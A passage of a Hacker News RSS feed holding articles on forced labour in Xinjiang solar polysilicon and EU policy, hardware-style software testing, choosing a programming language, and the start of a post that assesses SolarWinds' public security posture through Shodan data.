<p>The group said its members were using supply chain management guidelines, certifications and standards to ensure that forced labor was not used, and that it was evaluating how to encourage best practices across the industry.</p>



<h3>Distancing measures</h3>



<p>If the EU’s solar sector wants to distance itself from solar components manufactured under questionable circumstances in Xinjiang, it would have several ways of doing so.</p>



<p>Bloomberg NEF’s Chase said one option would be to continue accepting components made with polysilicon from China, but insisting that material produced in Xinjiang be exempted from the mix blended in factories.</p>



<p>“There’s plenty of non-Xinjiang polysilicon,” Chase said — around a quarter of the global market in 2021 is expected to come from the U.S. and the EU. But she said enforcing the exclusion would be complicated and likely make little difference for the plight of any workers. </p>



<p>Xinjiang polysilicon would simply shift to the domestic market and customers in the EU and the U.S. “will pay an almost unnoticeable amount more for modules,” said Chase. “Honestly, it is unlikely to be a big deal for solar, but good news for companies that make silicon outside Xinjiang.”</p>



<p>Perhaps unsurprisingly, European manufacturers believe the answer is repatriating the industry back to the EU and using tariffs if necessary.</p>



<p>“Solar components can be produced in Europe,” EU ProSun’s Nitzschke said. “The companies making them were here until 2012 but they went bankrupt when the tariffs used to address Chinese overproduction and public financing were removed, allowing their companies to undercut us in terms of price.”</p>



<p>Nitzschke argued the EU should revise its trade deals and ensure that the same standards on human rights and forced labor that apply in Europe be extended to imported products. “We can’t have a level playing field if there’s ethical leakage, and you could prevent it by applying tariffs to products that don’t meet our standards.”</p>



<p>SolarPower Europe’s Hemetsberger said she didn’t favor trade tariffs due to their often counterproductive effect on European solar growth. "The best way of ensuring that imported goods abide by strict human rights protocols and ethical standards is improving the level of transparency of the global value chain so that EU-based suppliers can make informed decisions."</p>



<p>The European Commission has said the EU’s solar capacity needs to <a href="https://ec.europa.eu/clima/policies/strategies/2030_en#:~:text=2030%20climate%20and%20energy%20framework%20%2D%20existing%20ambition,32.5%25%20improvement%20in%20energy%20efficiency" target="_blank">grow five-fold by 2030</a> to meet its climate targets. Hemetsberger said there was a “solar manufacturing renaissance” underway in Europe.</p>



<p>“Nearly all areas of the supply chain can be produced in Europe,” said Gunter Erfurt, CEO of <a href="https://www.meyerburger.com/en/company/about-meyer-burger/management/" target="_blank">Meyer Burger</a>, a Swiss-German solar module production company that aims to reestablish solar’s industrial supply chain on the Continent, pointing out that solar-grade polysilicon is <a href="https://www.wacker.com/cms/en-us/about-wacker/wacker-at-a-glance/profile-and-organization/wacker-polysilicon.html" target="_blank">already produced</a> at several sites in Germany.&nbsp;</p>



<p>“I have a lot of respect for the Chinese strategy because 10 years ago they understood what Europe is still struggling to grasp: that solar is the future,” he said. “EU leaders speak of batteries, electric mobility, hydrogen … But where is the electricity to produce those things supposed to come from? We are already the technological frontrunners, what we need now is financing to bring production back.”&nbsp;</p>



<h3>Growing pressure on Brussels</h3>



<p>Solar panels are yet another example of goods made with forced labor entering the EU market, raising <a href="https://www.politico.eu/?p=1572638">criticisms from lawmakers and NGOs</a>.&nbsp;</p>



<p>Joerg Wuttke, president of the EU Chamber of Commerce in China, expects the EU to step up scrutiny of imports from Xinjiang, including solar power panels.</p>



<p>“The pressure is piling on the Commission and member states that they have to use unilateral means to send China a message, such as screening of imported products,” said Wuttke.&nbsp;</p>



<p>Brussels <a href="https://www.politico.eu/article/eu-china-inestment-agreement-soft-approach-odds-us/">is taking its time</a> when its comes to tackling goods made with forced labor.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="614" src="https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1024x614.jpg" alt="" srcset="https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1024x614.jpg 1024w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-300x180.jpg 300w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-768x461.jpg 768w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1536x921.jpg 1536w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-714x428.jpg 714w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-406x242.jpg 406w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1160x696.jpg 1160w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-380x228.jpg 380w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-115x69.jpg 115w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-200x120.jpg 200w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-433x260.jpg 433w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-60x36.jpg 60w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1200x720.jpg 1200w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-333x200.jpg 333w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1120x672.jpg 1120w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-600x360.jpg 600w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231-1320x792.jpg 1320w, https://www.politico.eu/wp-content/uploads/2021/02/10/200515%C2%A9DM0231.jpg 1979w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>A Meyer Burger engineer working on solar cells at a company site in Germany | Detlev Müller/Meyer Burger</figcaption></figure>



<p>The Commission is working on <a href="https://www.politico.eu/?p=1496802">a new tool</a> — due diligence legislation — which would make EU companies accountable if their suppliers breach labor and climate laws. But MEPs would like the Commission to go even further to tackle serious situations such as the one in Xinjiang. Last month, the European Parliament’s legal affairs committee <a href="https://www.politico.eu/?p=1590418">called on</a> the Commission to introduce an import ban for “products related to severe human rights violations.”</p>



<p>“The EU due diligence legislation has a key role to play in that as it will help ensure that human rights are respected throughout our supply chains,” said MEP Cavazzini. She backs an import ban if suppliers are shown to be involved in human rights abuses.</p>



<p>The Commission is <a href="https://ec.europa.eu/info/law/better-regulation/have-your-say/initiatives/12548-Sustainable-corporate-governance" target="_blank">set to</a> come up with its supply chain responsibility proposal by June after a public consultation ended this week.</p>



<p>According to Justice Commissioner Didier Reynders, who is in charge of the file, new rules are likely to focus on so-called Tier 1 suppliers and to make reference to the International Labor Organization’s core conventions, which China committed to ratify under the new investment deal concluded with the EU.</p>



<p>“Expanding the use of renewables is of utmost importance in order to stop the climate crisis. But it cannot come at the cost of human rights,” said Cavazzini.</p>



<p><em>Want more analysis from </em><span>POLITICO</span><em>? </em><span>POLITICO</span><em> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="https://www.politico.eu/cdn-cgi/l/email-protection#6e1e1c012e1e0102071a070d01400b1b" target="_blank"><span data-cfemail="83f3f1ecc3f3ecefeaf7eae0ecade6f6">[email&nbsp;protected]</span></a> to request a complimentary trial.</em></p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/xinjiang-china-polysilicon-solar-energy-europe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119752</guid>
            <pubDate>Fri, 12 Feb 2021 23:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rethinking Software Testing: Perspectives from the World of Hardware]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26119482">thread link</a>) | @whack
<br/>
February 12, 2021 | https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		




<p>The hardware and software worlds may seem poles apart, and in many ways, they indeed are. But there’s a wealth of knowledge that each can learn from the other. Despite the seemingly massive differences in the final product, they share more in common than you might expect. </p>



<p>Computer engineers at places like Intel, just like software engineers, spend most of their time sitting at their desks, writing (verilog) code that implements the desired system behavior. They then compile (synthesize) their code in order to generate lower-level outputs (digital circuits and physical layouts). And finally, they write automated tests that exercise their <a href="https://en.wikipedia.org/wiki/System_under_test" target="_blank" rel="noreferrer noopener">SUT</a>, to ensure that the code is functionally correct. Sound familiar?</p>



<p>I know all this intimately, given my own past as a hardware engineer, and my later transition into software development. After finishing my Master’s degree in Computer Architecture, I spent over 5 years working at Intel and Sun as a Hardware Verification engineer, before turning down a senior-staff role at Apple, in order to reboot my career as a software developer.</p>



<p>In the past 5 years, I’ve worked in some great software teams at places like Google, and have also led development for multiple personal projects in my free time. The programmers that I’ve met and worked with are undoubtedly smart, and possess a number of skills that my hardware colleagues should strive to emulate. However, one thing I’ve noticed is that when it comes to testing, their instincts have been… off. Way off. </p>



<p>Here’s my attempt to distill the lessons I’ve learnt from my Hardware days, and how they can be applied to improve our Software testing methodologies and outcomes.</p>



<p><em>Disclaimer: this post is focused on non-UI programming, where functionality can be 100% covered without the need for “eyeballing”. Front-end/UI testing is a whole other beast that I wouldn’t comment on or touch with a ten foot pole.</em></p>







<p>The elephant in the room in most software companies, is the perceived importance of testing. In hardware, <a rel="noreferrer noopener" href="https://anysilicon.com/verification-validation-testing-asicsoc-designs-differences/" target="_blank">pre-silicon verification</a> is a first-class citizen in the development process. Dedicated verification engineers earn 6 figure salaries, sit next to their RTL design counterparts in all planning meetings, and enjoy careers that are just as prestigious and lucrative. In comparison, at most software companies I’ve come across, testing is treated as a 2nd class citizen – being a “test engineer” (or worse, “tester”) is often maligned as being less prestigious or lucrative.</p>



<p>This difference in culture isn’t an accident of nature. It’s a natural consequence of the much higher stakes in the hardware world. Because the <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Tape-out" target="_blank">tapeout</a> process is so expensive and time consuming, finding even a single bug can delay your product launch by months, and cost you millions of dollars in additional expenses. Or worse: finding a bug after your customers have already purchased and installed the chips, can result in <a href="https://en.wikipedia.org/wiki/Pentium_FDIV_bug" target="_blank" rel="noreferrer noopener" aria-label="extremely expensive product recalls (opens in a new tab)">extremely expensive product recalls</a>. Even if the fix is a simple one-line code change.</p>



<p>The consequences of software bugs can certainly be disastrous. But at least the fix is extremely cheap logistically – code deployments and software patches are vastly faster and cheaper than manufacturing and distributing new silicon. Hence why hardware organizations take testing much more seriously than comparable software companies.</p>



<p>The results do speak for themselves. Hardware products that are in the hands of customers, have an order-of-magnitude fewer bugs. The percentage of bugs that are caught prior to release, is vastly higher in the hardware industry as compared to the software industry.</p>



<h4>A Better Way</h4>



<p>It is tempting to say that hardware teams are better at testing, purely because of their greater financial investment. That software teams are already operating at their most ideal, and that improvements in testing-quality can only be had through sacrifices in time/cost. </p>



<p>Such a view is unjustifiably optimistic about the current state of affairs, and pessimistic about our potential for improvement. Over the past decades we have vastly improved our software-development practices and methodologies. There’s no reason to believe that we have now achieved a state of nirvana where no further improvements are possible.</p>



<p>Even though many programmers tend to short change it, testing-methodology is itself a skill set. One that is learned over time by an entire industry, at a rate proportional to its level of investment. And in this sense, the hardware industry is miles ahead when it comes to testing best-practices. Not because they are “smarter” in any way, but simply because their survival depends on it.</p>



<p>You wouldn’t expect a football player to be able to jump as high as a basketball player.<br>You wouldn’t expect a restaurant to take cleanliness as seriously as a hospital.<br>You definitely shouldn’t expect a software organization to master testing best-practices, the way a hardware company has.</p>



<p>If you want to master the art of testing, talk to a hardware verification engineer.</p>







<h2>The 0th Law of Testing: Only the Paranoid Survive</h2>



<p>If it hasn’t been tested, it doesn’t work. <em><a rel="noreferrer noopener" aria-label="“If this isn't absolutely true, it is certainly a good working assumption for project work.” (opens in a new tab)" href="http://www.hyperthot.com/pm_princ.htm" target="_blank">“If this isn’t absolutely true, it is certainly a good working assumption for project work.” </a></em>This rule forms the foundation for most other lessons listed here.</p>



<p>Word of Warning: The universe of all possible inputs and corner-cases is infinite. Hence, you will never attain 100% coverage via empirical testing. You will never cross the finish-line. If you ever think that you are “done” with testing, you’re in for a surprise. All you can do is chase as much coverage as can be attained, with the amount of time and resources available.</p>



<h2>Manual Testing is not good enough</h2>



<p>Things I’ve heard developers say:</p>



<p><em>“This is so important, that we have to test it manually. I don’t trust an automated test to do the job.”</em><br><em>“Don’t worry about trying to build automated tests. We’ve been manually testing these changes.”</em></p>



<p>What a Hardware engineer would say instead:</p>



<p><em>“This is so important, that we have to build an automated test suite for it. I don’t trust human testers to do the job.”</em><br><em>“Maybe run a few tests manually as a final sanity check, but don’t spend too much time since it’s been auto-tested pretty well.”</em></p>



<p>Running a couple tests by hand and eyeballing the results, might work in a college VLSI class. But it’s going to get you laughed at in industry. Manual testing cannot be code-reviewed on GitHub. Manual testing is subject to human error, whether due to oversight or laziness. Manual testing is extremely time and labor intensive, when subjected to every single release.</p>



<p>There might be specific exceptions where a test cannot be automated. But these should be the exception – not the norm. Reliability ultimately comes from the strength of your automated test suite, not how much manual testing you’re doing. Anything important enough to test by hand, is important enough to build an automated test suite for.</p>



<h2><strong>Testing Two Inputs in Isolation != Testing Them Together</strong></h2>



<figure><div>

</div></figure>



<p>Suppose your team is implementing and testing the following method:</p>


<pre title="">public static double myCustomDivider(double numerator, double divisor);
</pre>


<p>Alice:<em> “Do we have tests checking correct behavior for negative inputs?”</em><br>Bob:<em> “I have a test where the numerator is negative, and another test where the divisor is negative”</em><br>Alice: <em>“Do you have a 3rd test where they are both negative?”</em><br>Bob: <em>“No, and we don’t need that. We’ve already covered both cases individually.”</em></p>



<p>You laugh, but I’ve heard variations of this said far too many times, by far too many senior developers.</p>



<p>If the 2 inputs are completely decoupled, maybe it makes sense to assume we don’t need to test them in combination. But often times, 2 inputs which are assumed to be decoupled, aren’t nearly as decoupled as people think. And even if the implementation is indeed decoupled at the time of writing the test, it can often evolve to become coupled at a later time. As the saying goes: <em>“It ain’t what you don’t know that gets you into trouble. It’s what you know for sure that just ain’t so.”</em></p>



<p>As a general heuristic: If 2 inputs are both being parsed within the same method, there is definitely value in testing them in combination.</p>



<p>Perhaps you’ve decided that the risk-reward tradeoff merits not writing tests to cover some combinations. This is certainly a reasonable decision to make, depending on the particular project circumstances and the events being considered. But do so cognizant of the risk you’re taking on. Do not delude yourself into thinking that there’s no value in testing combinations of multiple events.</p>



<h2>Testing Output_A for Event_1 != Testing Output_A for Event_2</h2>



<p>Suppose you find yourself needing to test the following addPerson method:</p>


<pre title="">public int getAge(String name);
public int getHeight(String name);
public int getWeight(String name);

// Returns true if a previous value was overwritten
public boolean addPerson(Person person);
</pre>


<p>And so you write the following tests:</p>


<pre title="">@Test
public void addNewPerson_shouldReturnFalse() {
  Person person = new Person("john", 30, 175, 70);
  boolean result = system.addPerson(person);
  Truth.assertThat(result).isFalse();
  getAndCheckPerson(person);
}

@Test
public void addPerson_alreadyExists_shouldReturnTrue() {
  Person originalJohn = new Person("john", 30, 175, 70);
  system.addPerson(originalJohn);

  Person updatedJohn = new Person("john", 31, 174, 71);
  boolean result = system.addPerson(updatedJohn);

  Truth.assertThat(result).isTrue();
  getAndCheckPerson(updatedJohn);
}

private void getAndCheckPerson(Person person) {
  Truth.assertThat(system.getAge(person.name))
    .isEqualTo(person.age);
  Truth.assertThat(system.getHeight(person.name))
    .isEqualTo(person.height); 
  Truth.assertThat(system.getWeight(person.name))
    .isEqualTo(person.weight);
}
</pre>


<p>The following conversation then ensues.<br>John: <em>“Hey, why are you checking the age/height/weight all over again in the …</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/">https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/</a></em></p>]]>
            </description>
            <link>https://software.rajivprab.com/2019/04/28/rethinking-software-testing-perspectives-from-the-world-of-hardware/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119482</guid>
            <pubDate>Fri, 12 Feb 2021 22:51:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Calvin and Hobbes Search Engine]]>
            </title>
            <description>
<![CDATA[
Score 450 | Comments 156 (<a href="https://news.ycombinator.com/item?id=26119380">thread link</a>) | @bookofjoe
<br/>
February 12, 2021 | http://michaelyingling.com/random/calvin_and_hobbes/ | <a href="https://web.archive.org/web/*/http://michaelyingling.com/random/calvin_and_hobbes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://michaelyingling.com/random/calvin_and_hobbes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119380</guid>
            <pubDate>Fri, 12 Feb 2021 22:40:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anyone can control the lights in my kitchen over the Internet]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26119075">thread link</a>) | @sysrpl
<br/>
February 12, 2021 | https://www.codebot.org/articles/?doc=9633 | <a href="https://web.archive.org/web/*/https://www.codebot.org/articles/?doc=9633">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.codebot.org/articles/?doc=9633</link>
            <guid isPermaLink="false">hacker-news-small-sites-26119075</guid>
            <pubDate>Fri, 12 Feb 2021 22:04:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Questions to Ask When Choosing a Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118921">thread link</a>) | @ingve
<br/>
February 12, 2021 | https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/ | <a href="https://web.archive.org/web/*/https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-6502">
	<!-- .entry-header -->

	
	
	<div>
		
<p>This week I had a discussion with one of my friends on how to choose a programming language. It was triggered by multiple discussions I had with our customers on their engineering strategy in the last six months and one question that came multiple times was should we use X programming language for our new initiatives. Some customers were thinking of moving from .NET stack to Java, some banks were thinking about moving to Golang because their technical leaders have watched Monzo talks on Golang, for some it was from Java to Kotlin, and some were thinking of dumping JavaScript for Typescript.</p>



<p>To come up with the answer I try to find answers to following questions in context of the organization:</p>



<ul><li>What is the maturity of the programming language with respect to its community and ecosystem? Should they spend their one innovation token on this language?</li><li>How easy it is to find available talent in the market for that programming language?&nbsp;</li><li>How easy it is for the organization to acquire production engineering know-how for a programming language?</li><li>What are the productivity and efficiency gains that can be achieved from using a programming language? Are those gains aligned with the organization goals?</li><li>What are the use-cases an organization wants to solve with the programming language?</li><li>What is the future of a programming language? For a big enterprise it is important if the language can last for a decade.</li><li>What is the learning curve of the programming language? Can existing staff be upskilled?</li></ul>



<p>There is no correct answer to these questions. Most engineering organizations will end up using multiple programming languages. For example an organization may choose Golang as a general purpose language to build backend services, Python for scripting and data related work, Typescript for building web frontend. It is also possible that an engineering organization might choose Python for building most services and for few where performance and efficiency is important it chooses Golang. I think the important point is defining a small list of programming languages for the organization and documenting when you will choose which programming language.&nbsp;</p>



<p>I use a decision matrix like the one shown below to come up with one possible answer. Depending on which factors are important to the organization they can give them weights and that will impact the score of the language. In the image shown below, language 1 is the winner.</p>



<figure><img src="https://lh6.googleusercontent.com/WGB2gGPDUN24IZXig5kZSGzKwcpwSIfP5dzPMp5gxTpIGw5g5rRlqcsWPSTYDY0QWf6U0D14oL9dfTeRZlDanEwK54XjJIirmMeIGTL62skChi8YxVTBZcpeJyRbnveFCKYW3d7U" alt=""></figure>



<p>As I was writing this post a few more questions came to my mind.&nbsp;</p>



<ul><li>Does a programming language help us write less buggy software?</li><li>Does a programming language have some constructs that help us reduce the essential complexity of the system?</li><li>What constraints does a programming language impose and how do they impact the business goals?</li><li>Can a programming language be a competitive advantage for an organization?</li><li>Can a programming language influence the quality of the development team, the quality of code, and practices they follow?</li><li>Does a programming language influence engineering organization culture?</li><li>Can a programming language over time help average Joe become a good software engineer?</li><li>What makes a programming language future safe? Can we predict it to safeguard us?</li><li>Should a language choice depend on NFRs that you want to achieve?</li><li>How does a programming language influence behavior of a team?</li></ul>



<p>I don’t have answers to all of the above mentioned questions. I am hoping there is academic research done on the above but I am yet to read those papers.</p>



<p>I did some research on why different organizations choose certain languages and I found the following key points.</p>



<ol><li>Gitlab – Ruby – <a href="https://about.gitlab.com/blog/2018/10/29/why-we-use-rails-to-build-gitlab/">Link</a><ul><li>GitHub, a source of inspiration for GitLab, was also based on Rails, making it a logical pick considering his interest in the framework.</li><li>Ruby on Rails ecosystem allows you to shape a lot of functionality at a high quality</li><li>We need a lot of functionality and Ruby on Rails is a way to do it</li><li>Consistent coding practices. You are guided to do the right thing.</li><li>Big community of Ruby gems</li></ul></li><li>CockroachDB – Golang – <a href="https://www.cockroachlabs.com/blog/why-go-was-the-right-choice-for-cockroachdb/">Link</a><ul><li>its support for libraries, interfaces, and tooling positioned it as the right choice for CockroachDB</li><li>Go was designed to scale to large code bases with an emphasis on simplicity and orthogonality of features. The enforced code style, the simple imports and automated import management, the wide variety of linters, the straightforward (and minimal) set of programmatic idioms…all of these attributes of Go are important for clean, understandable code.</li><li>When comparing to Java, we appreciate the tight focus on implementation instead of OOP and abstraction: interfaces can be added when needed, not as an initial, often unnecessary, step.&nbsp;</li><li>When comparing to C++, we appreciate automatic memory management and how there’s rarely more than one way to get something done, for example with static and one-time initializers.</li><li>Go gives better control over memory allocation that impacts garbage collection.</li></ul></li><li>Asana – TypeScript – <a href="https://blog.asana.com/2014/11/asana-switching-typescript/">Link</a><ul><li>Clean JS</li><li>Community Support</li><li>Errors at compile time instead of runtime</li><li>Static typing</li></ul></li><li>American Express – Golang – <a href="https://go.dev/solutions/americanexpress/">Link</a> and <a href="https://americanexpress.io/choosing-go/">Link</a><ul><li>For their assessment, they chose to build a microservice in four different programming languages. They then compared the four languages for speed/performance, tooling, testing, and ease of development.</li><li>While Go may not have been the fastest language tested, its powerful tooling helped bolster its overall results. Go’s built-in testing framework, profiling capabilities, and benchmarking tools impressed the team.</li><li>Reasons<ul><li>Simple and straightforward</li><li>Encourage best practices</li><li>Concurrency</li><li>Tooling</li></ul></li></ul></li><li>Nubank – Clojure – <a href="https://building.nubank.com.br/working-with-clojure-at-nubank/">Link</a><ul><li>Nubank provides services in the finance domain, which is very close to mathematical functions — and functional programming is an excellent fit for both scenarios.</li><li>Clojure, on the other hand, has simple constructs that allow us to focus on the problem we are solving, making evolving the system a small incremental challenge, which doesn’t get that much harder over time.</li><li>Most of our codebase can be understood locally, looking at any given pure function, understanding its outputs for any given set of inputs. There’s rarely any need to reason about or recreate the internal state of objects. Data moves through the system in a composable, inspectable, consistent, and immutable way (without hiding it inside of objects).</li><li>Functional code is much easier to test, and that gives us the confidence to deploy an average of over 50 changes per day in a mission-critical domain.</li><li>Nubank has acquired Cognitect, the US-based software consultancy behind the Clojure programming language and the Datomic database</li></ul></li><li>Janestreet – Ocaml – <a href="https://www.youtube.com/watch?v=v1CmGbOGb2I">Link</a> , <a href="https://queue.acm.org/detail.cfm?id=2038036">Link</a> , and <a href="https://discuss.ocaml.org/t/does-jane-street-use-other-programming-languages-aside-from-ocaml/2761/5">Link</a><ul><li>Brevity of the language and the powerful type system that makes OCaml code very readable</li><li>Powerful abstraction capabilities that reduce boilerplates</li><li>Static type system for ensuring code correctness</li><li>He spoke about some of the fancy type tricks like parametric polymorphism, algebraic data types, type inference, phantom types and type indexed values that add to the expressivity of code.</li><li>Also OCaml hits the sweet spot between expressiveness of code and the performance numbers. The very much tunable GC makes things easier to control.</li></ul></li><li>Starling Bank – Java – <a href="https://www.infoq.com/presentations/starling-bank/">Link</a><ul><li>Exceptions are noisy and difficult to ignore</li><li>Reliable ecosystem (user base, tooling, job market, etc)&nbsp;</li><li>Integrations with legacy third parties (SOAP etc)</li></ul></li><li>KhanAcademy – Golang – <a href="https://blog.khanacademy.org/go-services-one-goliath-project/">Link</a><ul><li>Kotlin was more performant</li><li>Golang used much less memory</li></ul></li><li>Lyft – TypeScript – <a href="https://eng.lyft.com/typescript-at-lyft-64f0702346ea">Link</a><ul><li>Popularity</li><li>Type safety</li><li>Less Bugs</li><li>Productivity</li></ul></li><li>Medium – Golang – <a href="https://medium.engineering/rex-mediums-go-recommendation-microservice-e077bc9582a">Link</a><ul><li>More efficient use of the CPU. While Node is single-threaded, Go is much better suited for the combination of I/O and CPU-intensive operations required to build a ranked feed. Splitting our work onto separate Goroutines means we can avoid the issue of the CPU getting hogged by one single request and other requests getting starved.</li><li>Opinionated. Go makes it pretty hard to write “bad” code. A typed language that is also highly opinionated in terms of code styling means that even a newbie to Go (which I was when we started writing Rex) can quickly start writing clean and readable code.</li><li>Prior experience with Go. While much of Medium’s codebase is written in Node, we already had a few smaller-purpose microservices in Go. Adding another microservice in a language that we as a company have familiarity with makes building and maintaining this new service much easier.</li></ul></li><li>Instagram – Python – <a href="https://instagram-engineering.com/web-service-efficiency-at-instagram-with-python-4976d078e366">Link</a><ul><li>Simplicity</li><li>Practicality</li></ul></li></ol>



<p>I hope this post helps you understand that there is much more to choosing a programming language.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://shekhargulati.com/2021/02/12/questions-to-ask-when-choosing-a-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118921</guid>
            <pubDate>Fri, 12 Feb 2021 21:46:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SolarWinds: Going beyond attribution – all in a day’s work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118736">thread link</a>) | @Sami_Lehtinen
<br/>
February 12, 2021 | https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/ | <a href="https://web.archive.org/web/*/https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cms-source="/_layouts/blog.html" data-cms-index="0">
          
          <p>February 12, 2021</p>

<p>Monty Python’s “Bicycle Repair Man” is a fitting allegory for the information security industry. It is filled with supermen and -women who fight bad guys with their super powers, such as threat hunting, attribution and TTPs. The big question however is, are enough of us looking after our own infrastructure, our “bicycles”?</p>

<p>The SolarWinds case is no different, as in the heat of the moment everybody is focused on attributing the malice and all things related. My position is that in addition, we should also pay attention to what may have led into this situation, which oftentimes simply is poor security posture due to a failure in people, processes or technology.&nbsp;</p>

<p>Even more precisely, the crux of the problem often lies in poor IT processes related to patching, access control or other “boring stuff”, such as keeping X.509 certificates from expiring.</p>

<h2 id="how-dare-you-say-that-out-loud">How dare you say that out loud?</h2>

<p>Simply, because for more than a decade I’ve been helping people in their mission to reduce incidence of suspected compromise, publicly exposed vulnerable services or open services which may be unintentionally exposed to the Internet - at nation scale and through automation.</p>



<p>SolarWinds is a company, whose mission is to make the IT administration simpler and more secure at scale. This is a great mission and I fault the company not with what they have built or how secure their products are.</p>

<p>The challenge seems to be the fact how well they have their own people, processes and technology in line with what they enable their customers to achieve through their products.</p>

<h2 id="can-you-show-me-the-proof">Can you show me the proof?</h2>

<p>Yes, as the proof is in the open for everyone to see. Look at their publicly available network assets and connect the dots between the assets and known vulnerabilities observed through Shodan. I did this with the help of our research into 86 specific known and vetted issues on Shodan and matched the data against the SolarWinds assets and the picture is quite clear and unflattering.</p>

<h2 id="why-are-you-singling-them-out">Why are you singling them out?</h2>

<p>Their case is actual and well known and if a tragedy on such a scale can contribute to the common good, then we should seize the opportunity. On 2021-01-12, we reached out to SolarWinds to confirm that the network assets we used for the evaluation actually belong to them. We even offered them the findings to help them mitigate them. Unfortunately, they did not respond to our requests and we are now publishing our results in this blog post.</p>

<p>Given the constraints I lay out below, they clearly have not done their due diligence and as a result we have this mess, where threat actors must have had a field day in gaining initial access to the company - no zero days needed.</p>

<p>I implore you to reflect that in addition to threat signatures and TTPs about the malice, we need to start looking at the security posture of organizations as well - and not just after a high profile breach such as this one. The information I present below after all, is public and most likely used by threat actors every single day.</p>

<p>Furthermore, the vulnerabilities I detail below, plague most organizations on the Internet. Picking three prominent US defense contractors at random, I found most of the same issues related to their network assets as well, namely General Dynamics, Harris Corporation or Northrop Grumman.</p>

<h2 id="so-whats-the-evidence">So what’s the evidence?</h2>

<p>As stated above, I used the 86 vetted queries from Shodan against the publicly available network asset information related to SolarWinds. In essence, I used the same approach as the cyber rating companies do, which means that they rely in large part on publicly available IP network registration information when producing their ratings of you.</p>

<p>To be reproducible, the uncertainties related to the interpretation of the results must at least account for the following four things:</p>

<ol>
  <li>That the network asset in question belongs to the right party, which in this case study should be SolarWinds.</li>
  <li>That the service in question may be honeypot, whose intention is to monitor for scanning and/or exploitation of the emulated service.</li>
  <li>That the service implementation based version matching suffers from patch backporting, which means that the detection or assessment method cannot solely rely on a simple version banner.</li>
  <li>That the party doing the interpretation has to be able to understand the impact, as just having all the Shodan matches against a network asset alone makes interpretation difficult in practice.</li>
</ol>

<h2 id="what-are-the-observations-then">What are the observations then?</h2>

<p>In this case, I used evidence from the last 6 months mapped against the publicly available network asset attributable to SolarWinds. Mapping the 86 topics against those assets with automation, I was able to detect seven distinct vulnerabilities in their infrastructure, as follows:</p>

<p><img src="https://d1qmdf3vop2l07.cloudfront.net/swell-rail.cloudvent.net/hash-store/0f84f98834724a9d07eea6fba20806d4.png" alt="" width="1390" height="532" data-cms-original-src="/images/content/image1-1.png"></p>

<h4 id="expired-x509">Expired X.509</h4>

